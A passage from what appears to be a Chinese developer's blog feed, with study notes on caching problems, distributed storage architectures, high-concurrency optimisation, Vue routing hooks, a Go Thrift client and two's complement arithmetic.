<h3 id="2-数据模型与查询语言"><a href="#2-数据模型与查询语言" class="headerlink" title="2. 数据模型与查询语言"></a>2. 数据模型与查询语言</h3><h4 id="2-1-数据库分类"><a href="#2-1-数据库分类" class="headerlink" title="2.1. 数据库分类"></a>2.1. 数据库分类</h4><p><strong>关系型</strong></p>
<ul>
<li>数据之间存在关系，查询需要按照关系进行查询</li>
<li>一般是多对多的关系</li>
<li>如sql、网络数据库、图数据库</li>
</ul>
<p><strong>文档型</strong></p>
<ul>
<li>一对多，一个id对应很多数据，但是数据之间关系不大</li>
<li>如json、xml等</li>
</ul>
<h2 id="第二部分-分布式数据系统"><a href="#第二部分-分布式数据系统" class="headerlink" title="第二部分 分布式数据系统"></a>第二部分 分布式数据系统</h2><h2 id="第三部分-派生数据"><a href="#第三部分-派生数据" class="headerlink" title="第三部分 派生数据"></a>第三部分 派生数据</h2><h1 id="实践场景"><a href="#实践场景" class="headerlink" title="实践场景"></a>实践场景</h1><h2 id="1-百万级并发优化实战"><a href="#1-百万级并发优化实战" class="headerlink" title="1. 百万级并发优化实战"></a>1. 百万级并发优化实战</h2><h3 id="1-1-背景"><a href="#1-1-背景" class="headerlink" title="1.1. 背景"></a>1.1. 背景</h3><ul>
<li>主场景为认证、资源列表下发、环境上报、资源访问鉴权</li>
</ul>
<h3 id="1-2-如何优化点分析"><a href="#1-2-如何优化点分析" class="headerlink" title="1.2. 如何优化点分析"></a>1.2. 如何优化点分析</h3><p><strong>本地集群瓶颈</strong></p>
<ul>
<li>模拟高峰流量，分析到是cpu占用过高，然后是数据库瓶颈，然后是内存</li>
</ul>
<h3 id="1-3-优化过程"><a href="#1-3-优化过程" class="headerlink" title="1.3. 优化过程"></a>1.3. 优化过程</h3><h4 id="1-api级别短时效缓存"><a href="#1-api级别短时效缓存" class="headerlink" title="1) api级别短时效缓存"></a>1) api级别短时效缓存</h4><ul>
<li>业务处理多个地方调用接口查询数据库，对同一个数据进行多次查询不能每一次都读io</li>
<li>对接口进行api级别缓存，业务代码可直接调用数据库接口查询，接口内部会对查询数据进行缓存</li>
</ul>
<h4 id="2-数据预处理"><a href="#2-数据预处理" class="headerlink" title="2) 数据预处理"></a>2) 数据预处理</h4><ul>
<li>对于每次都需要进行复杂转换和计算的大数据，提前进行预处理储存到缓存中，每次只需要读取结果即可</li>
</ul>
<h4 id="3-运行时数据缓存（时间局部性）"><a href="#3-运行时数据缓存（时间局部性）" class="headerlink" title="3) 运行时数据缓存（时间局部性）"></a>3) 运行时数据缓存（时间局部性）</h4><ul>
<li>对于登陆访问过程中通过不同api查询同样的数据，将数据和对应id进行缓存</li>
<li>第一个api调用查询数据库然后缓存，后续直接通过id查询即可，不需要再查询数据库</li>
</ul>
<h4 id="4-非核心业务降频排队"><a href="#4-非核心业务降频排队" class="headerlink" title="4) 非核心业务降频排队"></a>4) 非核心业务降频排队</h4><ul>
<li>非核心业务可能会占用数据库并加锁，如果是io密集型，将其隔离并进行低优先级排队处理，防止阻塞核心业务</li>
</ul>
<h4 id="5-连接池分离"><a href="#5-连接池分离" class="headerlink" title="5) 连接池分离"></a>5) 连接池分离</h4><ul>
<li>不同业务的redis和数据库的连接池分离，核心业务和非核心业务分离，防止非核心业务占用核心业务连接池导致无法访问</li>
</ul>
<h4 id="6-数据库写操作有区分按不同优先级同-异步落盘"><a href="#6-数据库写操作有区分按不同优先级同-异步落盘" class="headerlink" title="6) 数据库写操作有区分按不同优先级同&#x2F;异步落盘"></a>6) 数据库写操作有区分按不同优先级同&#x2F;异步落盘</h4><ul>
<li>使用代理服务进行sql语句插入，可以进行批量插入和数据可视化</li>
<li>仅针对非强实时性要求的数据</li>
<li>可以有日志和重试可靠性处理</li>
</ul>
<h4 id="7-合并api请求数据"><a href="#7-合并api请求数据" class="headerlink" title="7) 合并api请求数据"></a>7) 合并api请求数据</h4><ul>
<li>当某个请求过程中，api可以复用下发数据，减少api调用次数</li>
<li>不止客户端到服务端的数据复用，服务端内部的链路也同样可以复用数据</li>
</ul>
<h4 id="8-高峰期分析"><a href="#8-高峰期分析" class="headerlink" title="8) 高峰期分析"></a>8) 高峰期分析</h4><ul>
<li>对于真实场景高峰期的cpu分析，找到是否数据库索引存在问题</li>
<li>对于需要计算类型的，提前进行预处理缓存，防止索引没命中导致的扫表</li>
</ul>
<h3 id="1-4-优化效果"><a href="#1-4-优化效果" class="headerlink" title="1.4. 优化效果"></a>1.4. 优化效果</h3><ul>
<li>一个主节点带两个工作节点，40w并发15min登陆上线完成，cpu占用不超过30%</li>
</ul>
<h2 id="2-微博场景"><a href="#2-微博场景" class="headerlink" title="2. 微博场景"></a>2. 微博场景</h2><h3 id="2-1-twitter推送"><a href="#2-1-twitter推送" class="headerlink" title="2.1. twitter推送"></a>2.1. twitter推送</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><ul>
<li>用户发布tweet，关注者在主页可以查看到其发布的消息，按照时间线排序</li>
<li>目标，3000w关注者5s内完成发布接收</li>
</ul>
<h4 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h4><p><strong>方案1</strong></p>
<ul>
<li>使用关系型数据库，每个用户发tweet插入到全局tweet库</li>
<li>每个关注者查询全局tweet库，根据自己关注的用户进行查询，获取到按照时间线排序的结果</li>
</ul>
<p><strong>方案2</strong></p>
<ul>
<li>使用redis对每个用户维护一个时间线缓存，类似邮箱</li>
<li>发布者发布tweet后，查询关注者，将tweet插入到所有关注者的时间线缓存中</li>
</ul>
<p><strong>对比</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>方案1</th>
<th>方案2</th>
</tr>
</thead>
<tbody><tr>
<td>优点</td>
<td>实现简单，发布tweet写入少</td>
<td>读负载降低，只需要读取缓存即可</td>
</tr>
<tr>
<td>缺点</td>
<td>全局tweet的读负载压力与日俱增</td>
<td>实现复杂，发布tweet写入多个关注者缓存中，大V情况下写入负载很高</td>
</tr>
</tbody></table>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul>
<li>twitter最后使用方案2的稳定实现，但是对于大V，使用方案1。使用混合方案可以达到很好的表现</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>后台开发</tag>
      </tags>
  </entry>
  <entry>
    <title>缓存</title>
    <url>/blogs/2022-11-27-cache/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-影响缓存命中率的因素"><a href="#1-影响缓存命中率的因素" class="headerlink" title="1. 影响缓存命中率的因素"></a>1. 影响缓存命中率的因素</h2><ul>
<li>缓存键集合<ul>
<li>键越少性能越高</li>
</ul>
</li>
<li>可以使用内存空间大小<ul>
<li>空间越大，缓存内容越多，命中率越高</li>
</ul>
</li>
<li>使用寿命</li>
</ul>
<h2 id="2-缓存为什么可以提升性能"><a href="#2-缓存为什么可以提升性能" class="headerlink" title="2. 缓存为什么可以提升性能"></a>2. 缓存为什么可以提升性能</h2><ul>
<li>缓存来自内存，比磁盘访问更快</li>
<li>减少数据库、磁盘和网络的压力，减少cpu的io时间</li>
<li>缓存最终结果，不需要再次计算</li>
</ul>
<h2 id="3-各种介质数据访问延迟"><a href="#3-各种介质数据访问延迟" class="headerlink" title="3. 各种介质数据访问延迟"></a>3. 各种介质数据访问延迟</h2><table>
<thead>
<tr>
<th>操作类型</th>
<th>大致时间</th>
</tr>
</thead>
<tbody><tr>
<td>本地内存</td>
<td>100ns</td>
</tr>
<tr>
<td>SSD磁盘搜索</td>
<td>100000ns</td>
</tr>
<tr>
<td>网络数据包在同一个数据中心来回时间</td>
<td>500000ns</td>
</tr>
<tr>
<td>非ssd磁盘搜索</td>
<td>10000000ns</td>
</tr>
<tr>
<td>按顺序从网络读取1MB数据</td>
<td>10000000ns</td>
</tr>
<tr>
<td>按顺序从非ssd磁盘读取1MB数据</td>
<td>3000000ns</td>
</tr>
<tr>
<td>跨大西洋网络数据包来回时间</td>
<td>150000000ns</td>
</tr>
<tr>
<td>每秒</td>
<td>1000000000ns</td>
</tr>
</tbody></table>
<h1 id="二、缓存分类和添加原则"><a href="#二、缓存分类和添加原则" class="headerlink" title="二、缓存分类和添加原则"></a>二、缓存分类和添加原则</h1><h2 id="1-使用场景分类"><a href="#1-使用场景分类" class="headerlink" title="1. 使用场景分类"></a>1. 使用场景分类</h2><h3 id="私有缓存"><a href="#私有缓存" class="headerlink" title="私有缓存"></a>私有缓存</h3><h3 id="共享缓存"><a href="#共享缓存" class="headerlink" title="共享缓存"></a>共享缓存</h3><h2 id="2-存储位置分类"><a href="#2-存储位置分类" class="headerlink" title="2. 存储位置分类"></a>2. 存储位置分类</h2><h3 id="本地缓存"><a href="#本地缓存" class="headerlink" title="本地缓存"></a>本地缓存</h3><h3 id="分布式缓存"><a href="#分布式缓存" class="headerlink" title="分布式缓存"></a>分布式缓存</h3><h2 id="3-实现方式分类"><a href="#3-实现方式分类" class="headerlink" title="3. 实现方式分类"></a>3. 实现方式分类</h2><h3 id="代理缓存"><a href="#代理缓存" class="headerlink" title="代理缓存"></a>代理缓存</h3><ul>
<li>通过代理服务器进行缓存，一般是客户端侧的缓存</li>
</ul>
<h3 id="反向代理缓存"><a href="#反向代理缓存" class="headerlink" title="反向代理缓存"></a>反向代理缓存</h3><ul>
<li>反向代理是在数据中心侧缓存，用户连接数据中心先连接反向代理服务器进行缓存查找</li>
<li>可以使用多层反向代理实现缓存</li>
</ul>
<h3 id="CDN缓存"><a href="#CDN缓存" class="headerlink" title="CDN缓存"></a>CDN缓存</h3><ul>
<li>内容分发网络，为网络服务商提供的服务，不在客户端也不在数据中心</li>
<li>第一个请求到数据中心，返回页面中的各项静态资源地址为cdn的服务器，客户端请求cdn的服务器获取资源</li>
<li>由cdn请求数据中心然后缓存到cdn服务器上返回</li>
</ul>
<h2 id="4-数据来源分类"><a href="#4-数据来源分类" class="headerlink" title="4. 数据来源分类"></a>4. 数据来源分类</h2><h3 id="通读缓存"><a href="#通读缓存" class="headerlink" title="通读缓存"></a>通读缓存</h3><ul>
<li>客户端只从缓存服务器获取数据，失效由缓存服务器进行请求后返回</li>
</ul>
<h3 id="旁路缓存"><a href="#旁路缓存" class="headerlink" title="旁路缓存"></a>旁路缓存</h3><ul>
<li>客户端先从缓存服务器获取，失效直接请求数据中心，如对象缓存</li>
</ul>
<h1 id="三、缓存问题和解决"><a href="#三、缓存问题和解决" class="headerlink" title="三、缓存问题和解决"></a>三、缓存问题和解决</h1><h2 id="1-缓存击穿"><a href="#1-缓存击穿" class="headerlink" title="1. 缓存击穿"></a>1. 缓存击穿</h2><ul>
<li>缓存击穿是指缓存中没有但是数据库中有的数据，一般是缓存到期。由于并发用户特别多，同时读缓存没有读到数据，就到数据库进行查询而形成压力</li>
</ul>
<h3 id="1-1-解决方案"><a href="#1-1-解决方案" class="headerlink" title="1.1. 解决方案"></a>1.1. 解决方案</h3><ul>
<li>设置热点数据永远不过期</li>
<li>互斥锁</li>
</ul>
<h2 id="2-缓存雪崩"><a href="#2-缓存雪崩" class="headerlink" title="2. 缓存雪崩"></a>2. 缓存雪崩</h2><ul>
<li>缓存雪崩是指同一时间缓存大面积失效，所有请求都会落到数据库上，造成数据库短时间处理大量请求而崩掉</li>
</ul>
<h3 id="2-1-解决方案"><a href="#2-1-解决方案" class="headerlink" title="2.1. 解决方案"></a>2.1. 解决方案</h3><ul>
<li>缓存数据的过期时间要随机设置，防止同一时间大量数据过期</li>
<li>给每个缓存数据添加缓存标记，记录缓存是否失效，标记失效立即更新，消耗较大，需要做监控</li>
<li>缓存预热，系统刚启动时先不对外提供服务，先将数据存入缓存再对外提供数据</li>
<li>互斥锁，对于某个key进行互斥，只让少量请求进行数据库操作，其余的进行排队，然后更新到缓存后就可以对缓存进行操作</li>
</ul>
<h2 id="3-缓存穿透"><a href="#3-缓存穿透" class="headerlink" title="3. 缓存穿透"></a>3. 缓存穿透</h2><ul>
<li>缓存穿透是指缓存和数据库中都没有数据，导致所有请求都落到数据库上</li>
<li>一般是攻击数据库会造成</li>
</ul>
<h3 id="3-1-解决方案"><a href="#3-1-解决方案" class="headerlink" title="3.1. 解决方案"></a>3.1. 解决方案</h3><ul>
<li>接口层增加校验，用户鉴权、id格式校验等</li>
<li>从缓存和数据库都取不到的数据，设置key-value为key-null,有效时间可以短一点，防止用户使用同一个key进行攻击</li>
<li>使用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一定不存在的数据会被bitmap进行拦截，减少对底层数据库的查询</li>
</ul>
<h2 id="4-热key问题的处理"><a href="#4-热key问题的处理" class="headerlink" title="4. 热key问题的处理"></a>4. 热key问题的处理</h2><h3 id="4-1-添加本地缓存"><a href="#4-1-添加本地缓存" class="headerlink" title="4.1. 添加本地缓存"></a>4.1. 添加本地缓存</h3><h3 id="4-2-热key探查"><a href="#4-2-热key探查" class="headerlink" title="4.2. 热key探查"></a>4.2. 热key探查</h3><ul>
<li>集群环境下，所有流量会分布到不同设备上，在客户端进行探查会不够真实，所以一般是在客户端到redis之间添加proxy进行热key探查</li>
</ul>
<h4 id="1-京东"><a href="#1-京东" class="headerlink" title="1) 京东"></a>1) 京东</h4><ul>
<li>在客户端和redis之间添加一层proxy，proxy对所有key进行访问统计</li>
<li>推送到客户端上，客户端对热key进行本地缓存</li>
</ul>
<h4 id="2-阿里云"><a href="#2-阿里云" class="headerlink" title="2) 阿里云"></a>2) 阿里云</h4><ul>
<li>同样是proxy，但是热key的缓存放到proxy上，不会推送给客户端</li>
</ul>
<h2 id="5-不需要使用缓存的场景"><a href="#5-不需要使用缓存的场景" class="headerlink" title="5. 不需要使用缓存的场景"></a>5. 不需要使用缓存的场景</h2><ul>
<li>频繁修改的数据</li>
<li>没有热点的数据</li>
</ul>
<h2 id="5-缓存失效方式"><a href="#5-缓存失效方式" class="headerlink" title="5. 缓存失效方式"></a>5. 缓存失效方式</h2><ul>
<li>超时失效</li>
<li>实时通知清除</li>
<li>LRU算法清理</li>
</ul>
<h1 id="四、分布式对象缓存"><a href="#四、分布式对象缓存" class="headerlink" title="四、分布式对象缓存"></a>四、分布式对象缓存</h1><ul>
<li>memcached</li>
</ul>
<h2 id="1-查找缓存方式"><a href="#1-查找缓存方式" class="headerlink" title="1. 查找缓存方式"></a>1. 查找缓存方式</h2><ol>
<li>使用客户端里面的路由算法来查找到哪个服务器</li>
<li>再通过通讯模块进行连接访问</li>
</ol>
<h2 id="2-路由算法"><a href="#2-路由算法" class="headerlink" title="2. 路由算法"></a>2. 路由算法</h2><h3 id="2-1-余数hash"><a href="#2-1-余数hash" class="headerlink" title="2.1. 余数hash"></a>2.1. 余数hash</h3><ul>
<li>使用取余来查找服务器</li>
<li>如果添加服务器，可能造成缓存雪崩，因为余数不一致</li>
</ul>
<h3 id="2-2-一致性hash"><a href="#2-2-一致性hash" class="headerlink" title="2.2. 一致性hash"></a>2.2. 一致性hash</h3><ul>
<li>一般环取 $2^{32}-1$</li>
<li>将节点计算hash放到环上，对key也计算hash在环上查找后面最近的节点，缓存就在此节点</li>
<li>可以动态扩容服务器，不会影响原有的节点hash和分布，仅影响最近的一个节点，部分key会查找到此节点</li>
<li>由于hash值不确定，可能会造成部分节点数据很多，部分很少，添加一个节点并不能分担大部分节点压力，仅能影响最近的节点</li>
</ul>
<h3 id="2-3-一致性hash改进（虚拟节点）"><a href="#2-3-一致性hash改进（虚拟节点）" class="headerlink" title="2.3. 一致性hash改进（虚拟节点）"></a>2.3. 一致性hash改进（虚拟节点）</h3><ul>
<li>物理节点分为多个虚拟节点，将虚拟节点加到环上</li>
<li>单个物理节点加入，由于虚拟节点很多，所以可以分担大部分节点压力</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>分布式存储</title>
    <url>/blogs/2022-11-27-distributed-storage/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h1 id="二、几种分布式存储的架构"><a href="#二、几种分布式存储的架构" class="headerlink" title="二、几种分布式存储的架构"></a>二、几种分布式存储的架构</h1><p>参考 <a href="https://zhuanlan.zhihu.com/p/55964292">一篇文章讲透分布式存储</a></p>
<h2 id="1-中间控制节点架构-HDFS"><a href="#1-中间控制节点架构-HDFS" class="headerlink" title="1. 中间控制节点架构 HDFS"></a>1. 中间控制节点架构 HDFS</h2><ul>
<li>由谷歌提出</li>
<li>通过廉价的服务器来提供大规模，高并发场景下的web访问问题</li>
<li>服务器分为两种类型：namenode和datanode</li>
<li>可以横向扩展datanode的数量来增加承载能力，实现动态横向扩展</li>
</ul>
<h3 id="1-1-namenode"><a href="#1-1-namenode" class="headerlink" title="1.1. namenode"></a>1.1. namenode</h3><ul>
<li>储存管理数据，比如文件在哪个datanode</li>
<li>一般使用主备集群部署</li>
</ul>
<h3 id="1-2-datanode"><a href="#1-2-datanode" class="headerlink" title="1.2. datanode"></a>1.2. datanode</h3><ul>
<li>储存实际数据</li>
<li>一般由大量节点构成一个集群</li>
</ul>
<h2 id="2-完全无中心架构——计算模式-Ceph"><a href="#2-完全无中心架构——计算模式-Ceph" class="headerlink" title="2. 完全无中心架构——计算模式 Ceph"></a>2. 完全无中心架构——计算模式 Ceph</h2><ul>
<li>没有中心节点，可以避免中心节点的性能瓶颈</li>
<li>存在三个服务：Mon、OSD、MDS</li>
<li>访问流程为客户端从Mon服务拉取存储资源布局信息，然后根据布局信息和写入数据的名称等信息计算出期望数据的位置，然后和该位置直接通信</li>
</ul>
<h3 id="2-1-Mon服务"><a href="#2-1-Mon服务" class="headerlink" title="2.1. Mon服务"></a>2.1. Mon服务</h3><ul>
<li>用于维护存储系统的硬件逻辑关系，主要是服务器和硬盘等在线信息</li>
<li>通过集群保证服务可用性</li>
</ul>
<h3 id="2-2-OSD服务"><a href="#2-2-OSD服务" class="headerlink" title="2.2. OSD服务"></a>2.2. OSD服务</h3><ul>
<li>用于实现对磁盘管理、实现真正的数据读写</li>
<li>一个磁盘对应一个OSD服务</li>
</ul>
<h2 id="3-完全无中心架构——一致性哈希-Swift"><a href="#3-完全无中心架构——一致性哈希-Swift" class="headerlink" title="3. 完全无中心架构——一致性哈希 Swift"></a>3. 完全无中心架构——一致性哈希 Swift</h2><ul>
<li>将设备做成一个哈希环，根据数据名称计算出的哈希值映射到哈希环的某个位置实现数据定位</li>
</ul>
<h3 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1. 原理"></a>3.1. 原理</h3><ul>
<li>将磁盘划分为很多个虚拟分区，每个虚拟分区都是哈希环的一个节点</li>
<li>哈希环首尾相接，计算出数据的哈希值之后，必然落到哈希环的某个区间，然后顺时针必定能找到一个节点，为数据的存储位置</li>
<li>一般通过账户名&#x2F;容器名&#x2F;对象名三个名称组成一个位置的标识，用其计算出一个整型数来</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>后台开发</tag>
      </tags>
  </entry>
  <entry>
    <title>vue使用笔记</title>
    <url>/blogs/2022-11-07-vue/</url>
    <content><![CDATA[<h1 id="一、路由事件"><a href="#一、路由事件" class="headerlink" title="一、路由事件"></a>一、路由事件</h1><h2 id="1-点击导航到下一个页面"><a href="#1-点击导航到下一个页面" class="headerlink" title="1. 点击导航到下一个页面"></a>1. 点击导航到下一个页面</h2><ul>
<li>不会触发<code>beforeDestroy</code>，会触发<code>beforeRouteLeave</code>，可以在里面做一些清理工作</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; defineComponent, ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeRouteLeave</span>(<span class="params">to, <span class="keyword">from</span>, next</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换路由会触发</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">next</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beforeRouteLeave&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">timerHandler</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">timerHandler</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">timerHandler</span> = <span class="literal">undefined</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeRouteLeave</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换路由没有触发</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="小技巧与踩坑记"><a href="#小技巧与踩坑记" class="headerlink" title="小技巧与踩坑记"></a>小技巧与踩坑记</h1>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>thrift使用记录</title>
    <url>/blogs/2022-07-07-thrift/</url>
    <content><![CDATA[<h1 id="一、概念介绍"><a href="#一、概念介绍" class="headerlink" title="一、概念介绍"></a>一、概念介绍</h1><h1 id="二、golang实现"><a href="#二、golang实现" class="headerlink" title="二、golang实现"></a>二、golang实现</h1><h2 id="1-生成golang的文件"><a href="#1-生成golang的文件" class="headerlink" title="1. 生成golang的文件"></a>1. 生成golang的文件</h2><ul>
<li>thrift文件</li>
</ul>
<figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> go a.b.c</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span> startNetworkDiagnosis(<span class="number">1</span>: <span class="type">string</span> url, <span class="number">2</span>: <span class="type">string</span> traceid);</span><br><span class="line">    <span class="keyword">void</span> startResourceDiagnosis(<span class="number">1</span>: <span class="type">string</span> url, <span class="number">2</span>: <span class="type">string</span> traceid);</span><br><span class="line">    <span class="keyword">void</span> startResourceDiagnosisWithItems(<span class="number">1</span>: <span class="type">string</span> url, <span class="number">2</span>: <span class="type">string</span> traceid, <span class="number">3</span>: <span class="type">list</span>&lt;<span class="type">string</span>&gt; items);</span><br><span class="line">    <span class="type">bool</span> IsRpcStatusNormal();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成go文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">thrift --gen go xxx.thrift</span><br></pre></td></tr></table></figure>

<h2 id="2-客户端"><a href="#2-客户端" class="headerlink" title="2. 客户端"></a>2. 客户端</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;aTrustRpcClient/gen-go/sdptrusttunnelservice&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/apache/thrift/lib/go/thrift&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> defaultCtx = context.Background()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tunnelRpcHandler</span><span class="params">(reqJson <span class="type">string</span>, w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	startTime := currentTimeMillis()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新建一个默认配置，后续需要用到</span></span><br><span class="line">	cfg := &amp;thrift.TConfiguration&#123;&#125;</span><br><span class="line">	<span class="keyword">var</span> transport thrift.TTransport</span><br><span class="line">    <span class="comment">// 新建socket对对应端口建立连接</span></span><br><span class="line">	transport = thrift.NewTSocketConf(<span class="string">&quot;localhost:&quot;</span>+fmt.Sprint(tunnelRpcPort), cfg)</span><br><span class="line">    <span class="comment">// 根据端口建立一个buffered传输层</span></span><br><span class="line">	transport = thrift.NewTBufferedTransport(transport, <span class="number">10240</span>)</span><br><span class="line">    <span class="comment">// 基于传输层建立二进制协议</span></span><br><span class="line">	iprot := thrift.NewTBinaryProtocolConf(transport, cfg)</span><br><span class="line">    <span class="comment">// 这一步是发送使用多路复用</span></span><br><span class="line">	oprot := thrift.NewTMultiplexedProtocol(iprot, <span class="string">&quot;SdpTrustTunnelService&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始建立连接</span></span><br><span class="line">	<span class="keyword">if</span> err := transport.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, err.Error(), <span class="number">500</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> transport.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于协议和传输层新建客户端</span></span><br><span class="line">	client := sdptrusttunnelservice.NewSdpTrustTunnelServiceClientProtocol(transport, iprot, oprot)</span><br><span class="line">    <span class="comment">// 调用接口获得返回值</span></span><br><span class="line">	res, err := client.GetModuleStatus(defaultCtx, rpcReqData.ModuleName)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, err.Error(), <span class="number">500</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	endTime := currentTimeMillis()</span><br><span class="line">	fmt.Println(<span class="string">&quot;Program exit. time-&gt;&quot;</span>, endTime, startTime, (endTime - startTime))</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">	fmt.Fprintf(w, <span class="string">&quot;%s&quot;</span>, res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换成毫秒</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">currentTimeMillis</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> time.Now().UnixNano() / <span class="number">1000000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>计算机组成原理</title>
    <url>/blogs/2022-06-06-computer-composition/</url>
    <content><![CDATA[<h1 id="一、计算机组成"><a href="#一、计算机组成" class="headerlink" title="一、计算机组成"></a>一、计算机组成</h1><h2 id="1-cpu"><a href="#1-cpu" class="headerlink" title="1. cpu"></a>1. cpu</h2><h3 id="1-1-指令周期、cpu周期、时钟周期"><a href="#1-1-指令周期、cpu周期、时钟周期" class="headerlink" title="1.1. 指令周期、cpu周期、时钟周期"></a>1.1. 指令周期、cpu周期、时钟周期</h3><p>参考 <a href="https://zhuanlan.zhihu.com/p/90829922">【浅析】CPU中的指令周期、CPU周期和时钟周期</a></p>
<ul>
<li>一个指令周期包含取指令和执行指令，包含多个cpu周期</li>
<li>一个cpu周期包含多个时钟周期</li>
</ul>
<h1 id="二、机器码"><a href="#二、机器码" class="headerlink" title="二、机器码"></a>二、机器码</h1><h2 id="1-补码"><a href="#1-补码" class="headerlink" title="1. 补码"></a>1. 补码</h2><h3 id="1-1-为什么要有补码"><a href="#1-1-为什么要有补码" class="headerlink" title="1.1. 为什么要有补码"></a>1.1. 为什么要有补码</h3><p>做一个假设，要计算 $-1 + 1 &#x3D; 0$ ，如果没有补码，计算转二进制（按照8bit算）是</p>
<p>$$<br>00000001 + 10000001<br>$$</p>
<p>需要判断首位，来处理是加还是减，增加了加法器的复杂度。</p>
<p>使用补码将是</p>
<p>$$<br>000000001 + 11111111 &#x3D; 100000000<br>$$</p>
<p>第九位舍弃，使用加法器可以直接实现。所以补码是为了将符号位一起参与运算，减少硬件复杂度而出现的设计。</p>
<h3 id="1-2-补码转化"><a href="#1-2-补码转化" class="headerlink" title="1.2. 补码转化"></a>1.2. 补码转化</h3><ul>
<li>正数补码是本身</li>
<li>负数补码是对应的正数取反加一</li>
</ul>
<p>$$<br>-1 &#x3D; \neg 1 + 1 &#x3D; 11111110 + 00000001 &#x3D; 11111111<br>$$</p>
